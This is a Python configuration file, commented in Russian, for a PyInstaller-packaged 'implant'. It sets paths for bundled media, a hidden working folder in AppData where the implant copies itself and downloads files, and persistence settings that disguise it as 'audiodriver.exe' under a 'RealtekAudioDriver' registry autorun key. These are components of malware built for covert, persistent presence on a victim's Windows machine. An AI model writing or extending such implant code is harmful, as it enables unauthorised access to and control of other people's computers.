#
# --- Файл: implant_config.py (ФИНАЛЬНАЯ ВЕРСИЯ 2.0) ---
# Единый, правильный источник правды для всех путей и настроек импланта.
#
import os
import sys

# ==============================================================================
# ЭТАП 1: ОПРЕДЕЛЕНИЕ, ГДЕ МЫ НАХОДИМСЯ (ЗАПУЩЕНЫ КАК .EXE ИЛИ .PY)
# ==============================================================================

# PyInstaller устанавливает флаг 'frozen' в True, когда код выполняется из .exe.
FROZEN = getattr(sys, 'frozen', False)

# ==============================================================================
# ЭТАП 2: ОПРЕДЕЛЕНИЕ ПРАВИЛЬНОГО ПУТИ К ВСТРОЕННЫМ ФАЙЛАМ
# (Ключевое исправление, которое ты нашёл)
# ==============================================================================

# Когда PyInstaller запускает .exe, он создает временную папку `_MEIxxxxxx`
# и кладёт туда все ресурсы. Путь к этой папке хранится в `sys._MEIPASS`.
# Это - ЕДИНСТВЕННЫЙ правильный путь к нашим встроенным файлам 'audio_files' и 'image_files'.
if FROZEN:
    # Мы запущены из .exe, используем путь к временной папке.
    BASE_PATH = sys._MEIPASS
else:
    # Мы запущены как .py для отладки, ищем файлы в текущей папке проекта.
    BASE_PATH = os.path.dirname(os.path.abspath(__file__))

# Пути к ВСТРОЕННЫМ медиафайлам, которые были "вшиты" в .exe
BUILTIN_AUDIO_PATH = os.path.join(BASE_PATH, "audio_files")
BUILTIN_IMAGE_PATH = os.path.join(BASE_PATH, "image_files")

# ==============================================================================
# ЭТАП 3: ОПРЕДЕЛЕНИЕ ПОСТОЯННОЙ РАБОЧЕЙ ПАПКИ В APPDATA
# ==============================================================================

# Определяем постоянную рабочую папку в %AppData%.
# Сюда будут скачиваться новые файлы и копироваться сам имплант.
try:
    APP_DATA_PATH = os.path.join(os.getenv('APPDATA'), 'ScopeD_Implant_Data')
except Exception:
    import tempfile
    APP_DATA_PATH = os.path.join(tempfile.gettempdir(), 'ScopeD_Implant_Data')

# Пути к ЗАГРУЖЕННЫМ медиафайлам и временной папке для отчетов
DOWNLOADED_AUDIO_PATH = os.path.join(APP_DATA_PATH, "audio_files")
DOWNLOADED_IMAGE_PATH = os.path.join(APP_DATA_PATH, "image_files")
TEMP_PATH = os.path.join(APP_DATA_PATH, "temp")

# ==============================================================================
# ЭТАП 4: НАСТРОЙКИ УСТОЙЧИВОСТИ (АВТОЗАГРУЗКИ)
# ==============================================================================

# Имя, под которым имплант будет жить в системе после установки.
PERSISTENCE_EXE_NAME = "audiodriver.exe"

# Полный путь к "вечной" копии импланта.
PERSISTENCE_TARGET_PATH = os.path.join(APP_DATA_PATH, PERSISTENCE_EXE_NAME)

# Имя ключа в реестре для автозагрузки.
PERSISTENCE_REG_KEY_NAME = "RealtekAudioDriver"

# ==============================================================================
# ЭТАП 5: ИНИЦИАЛИЗАЦИЯ
# ==============================================================================

# Гарантируем, что вся структура рабочих папок существует при каждом запуске.
os.makedirs(DOWNLOADED_AUDIO_PATH, exist_ok=True)
os.makedirs(DOWNLOADED_IMAGE_PATH, exist_ok=True)
os.makedirs(TEMP_PATH, exist_ok=True)

# Выводим отладочное сообщение, чтобы при тесте видеть, что конфиг загружен.
print(f"[*] Конфигурация импланта загружена. Путь к ресурсам: {BASE_PATH}")